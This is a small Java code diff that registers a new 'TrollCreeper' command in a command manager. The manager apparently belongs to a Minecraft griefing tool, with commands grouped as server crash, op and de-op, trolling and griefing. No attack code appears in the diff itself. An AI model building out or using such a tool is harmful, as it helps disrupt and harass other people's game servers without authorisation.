@@ -32,6 +32,7 @@ import de.Garkolym.Commands.Server.CommandCrash;
 import de.Garkolym.Commands.Server.CommandDEOP;
 import de.Garkolym.Commands.Server.CommandOP;
 import de.Garkolym.Commands.Trolling.CommandGlasVirus;
+import de.Garkolym.Commands.Trolling.TrollCreeper;
 import de.Garkolym.Commands.Trolling.CommandKackRegen;
 
 public class CommandManager {
@@ -50,6 +51,7 @@ public class CommandManager {
 		// Trolling
 		this.getCommandList().add(new CommandKackRegen());
 		this.getCommandList().add(new CommandGlasVirus());
+		this.getCommandList().add(new TrollCreeper());
 		// Griefing
 		this.getCommandList().add(new CommandUltraCactus());
 		this.getCommandList().add(new CommandLuftangriff());
